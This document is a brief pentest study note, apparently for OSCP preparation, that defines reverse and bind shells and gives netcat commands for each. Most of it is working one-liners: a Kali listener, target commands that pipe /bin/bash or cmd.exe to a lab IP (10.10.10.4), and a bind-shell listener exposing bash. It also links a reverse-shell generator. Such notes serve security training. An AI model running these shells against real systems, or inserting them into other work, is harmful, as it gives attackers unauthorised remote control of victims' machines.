---
title: "Reverse & Bind Shell"
classes: single
ribbon: LightBlue
categories:
  - notes
tags:
  - beginner
  - pentest
  - recon
  - oscp
  - msfvenom
  - shell
  - reverse
  - bind
toc: true
hide_title: true
excerpt: ""
---

https://www.revshells.com/ - Great site to generate Reverse Shell
## Reverse Shell

**A reverse shell is a type of shell where the target machine initiates a connection back to the attacker's system. This allows the attacker to bypass firewalls and NAT, gaining remote control over the victim machine through an outbound connection.**
### Kali

```
nc -nvlp 1337
```

### Target

```
nc 10.10.10.4 1337 -e /bin/bash
# Linux target

nc 10.10.10.4 1337 -e cmd.exe
# Window target
```

## Bind shell

**A bind shell is a shell set up on the target machine that listens on a specific port. The attacker then connects to this port to gain control. It requires the victim's firewall to allow incoming connections, making it less stealthy than a reverse shell.**
### Target

```
nc -nvlp 1337 -e /bin/bash
```

## Kali

```
nc 10.10.10.4 1337
```